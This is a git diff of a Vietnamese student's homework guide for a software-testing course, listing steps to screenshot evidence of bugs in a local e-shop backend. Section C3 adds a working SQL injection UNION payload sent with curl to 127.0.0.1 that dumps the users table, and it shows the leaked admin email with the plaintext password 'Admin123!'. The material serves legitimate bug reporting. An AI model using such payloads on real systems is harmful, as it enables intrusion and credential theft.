@@ -137,9 +137,11 @@ cd "D:/Nam3/HK3/Kiểm thử phần mềm/HW05/HW05-Performance-Testing" && for 
 
 ---
 
-## C. Chụp ảnh bằng chứng cho 4 bug (§6) · ~15 phút
+## C. Chụp ảnh bằng chứng cho 5 bug (§6) · ~15-20 phút
 
-Bốn bug đã có bằng chứng số liệu, giờ cần ảnh. **Backend phải đang chạy** trước khi làm.
+Năm bug đã có bằng chứng số liệu VÀ đã được AI kiểm chứng bằng request thật (chạy
+`node bug-report/verify-bugs.mjs` ra `6/6 CONFIRMED`), giờ chỉ cần chụp ảnh lại. **Backend phải
+đang chạy** trước khi làm.
 
 ### C1 — Bug P1: `register` không có UNIQUE email
 
@@ -164,16 +166,25 @@ curl -s -w "\n--> HTTP status: %{http_code}\n" http://127.0.0.1:3000/api/product
 
 Kết quả: body `{}` nhưng status **200** (đáng lẽ phải 404). Chụp → lưu `bug-report\screenshots\p2-200-body-rong.png`
 
-### C3 — Bug P3: SQL injection ở `search` *(phải kiểm chứng trước khi báo!)*
+### C3 — Bug P3: SQL injection ở `search` — **đã xác nhận là Critical, chụp cả 2 lệnh**
+
+Đã kiểm chứng thật rồi (AI đã chạy) — đây không còn là "kiểm tra xem có bug không" mà là "chụp lại
+bằng chứng của một bug Critical đã xác nhận". Chạy lần lượt cả hai lệnh, chụp cả hai kết quả:
 
 ```bash
-curl -s -o NUL -w "search=a' --> HTTP %{http_code}\n" "http://127.0.0.1:3000/api/products?search=a'"
+curl -s -w "\n--> HTTP status: %{http_code}\n" "http://127.0.0.1:3000/api/products?search=a'"
 ```
 
-> ⚠️ **Nếu ra 500** → bug có thật, chụp màn hình và báo.
-> **Nếu ra 200** → **KHÔNG báo bug này**, và ghi vào bảng "Ứng viên đã kiểm và LOẠI" trong `bug-report.md`. Báo bug chưa kiểm chứng là lỗi nặng hơn bỏ sót bug.
+Kết quả: **HTTP 500** kèm thông báo lỗi SQL thật (`SQLITE_ERROR: unrecognized token`). Chụp → lưu
+`bug-report\screenshots\p3a-sqli-error500.png`
 
-Chụp → lưu `bug-report\screenshots\p3-sqli-search.png`
+```bash
+curl -s "http://127.0.0.1:3000/api/products?search=zzz_no_match%25%27%20UNION%20SELECT%201,email,password,role,1,1%20FROM%20users--%20" | head -c 500
+```
+
+Kết quả: trả về dữ liệu thật từ bảng `users` — dòng đầu tiên là `admin@eshop.com` kèm mật khẩu
+plaintext `Admin123!`. Đây là bằng chứng **rút được dữ liệu**, không chỉ là lỗi 500. Chụp → lưu
+`bug-report\screenshots\p3b-sqli-union-leak.png`
 
 ### C4 — Bug P5: payload 3,6 MB do không phân trang
 
@@ -183,11 +194,30 @@ curl -s -o NUL -w "search=Perf   --> %{size_download} bytes\n" "http://127.0.0.1
 
 Chụp → lưu `bug-report\screenshots\p5-payload-3mb.png`
 
+### C5 — Bug P6: restart backend xoá sạch database
+
+Bug này **không nên thực thi thật** (sẽ xoá dữ liệu bạn đang dùng cho các lượt đo khác). Thay vào
+đó, chụp lại đoạn code là bằng chứng đủ:
+
+1. Mở file `database.js` của backend (SUT) trong VS Code hoặc Notepad.
+2. Tìm dòng gọi `initDatabase()` ở cuối file, và bên trong hàm đó có các lệnh `DROP TABLE IF EXISTS`
+   cho từng bảng, chạy ngay lúc file được `require()` — không có điều kiện nào kiểm tra "đã có dữ
+   liệu chưa" trước khi xoá.
+3. Chụp đoạn code đó (kéo chọn khoảng 15-20 dòng quanh `initDatabase`). Chụp → lưu
+   `bug-report\screenshots\p6-restart-wipe-code.png`
+
+(Nếu muốn bằng chứng bằng số thay vì code: ghi lại số sản phẩm trước/sau một lần bạn **buộc phải**
+restart backend trong quá trình làm bài — ví dụ sau sự cố thật đã xảy ra ở bug P5 — chứ đừng chủ
+động restart chỉ để chụp ảnh.)
+
 ### Kiểm lại C
 
 ```bash
 cd "D:/Nam3/HK3/Kiểm thử phần mềm/HW05/HW05-Performance-Testing" && ls -la bug-report/screenshots/*.png
 ```
+
+Phải thấy đủ **6 file ảnh**: `p1-register-trung-email.png`, `p2-200-body-rong.png`,
+`p3a-sqli-error500.png`, `p3b-sqli-union-leak.png`, `p5-payload-3mb.png`, `p6-restart-wipe-code.png`.
 
 ---
 
@@ -205,10 +235,11 @@ Vào: **https://github.com/DuyPham111/HW05/issues** → bấm nút xanh **New is
 
 | Bug | Title |
 |---|---|
-| P1 | `[BUG] POST /api/register khong co UNIQUE constraint tren email - tao duoc tai khoan trung` |
-| P2 | `[BUG] GET /api/products/:id tra HTTP 200 + body rong cho id khong ton tai (dang le 404)` |
+| P3 | `[SECURITY][BUG] GET /api/products?search noi chuoi SQL - SQL injection, rut duoc toan bo bang users` |
 | P5 | `[PERF] GET /api/products khong phan trang - 3.6 MB/request, lam chet backend o 200 VU` |
 | P6 | `[BUG] Khoi dong lai backend xoa sach toan bo database` |
+| P1 | `[BUG] POST /api/register khong co UNIQUE constraint tren email - tao duoc tai khoan trung` |
+| P2 | `[BUG] GET /api/products/:id tra HTTP 200 + body rong cho id khong ton tai (dang le 404)` |
 
 **Body** — mở `bug-report/bug-report.md`, copy khối mô tả bug tương ứng (Pre-conditions / Steps / Expected / Actual / Severity) dán vào.
 
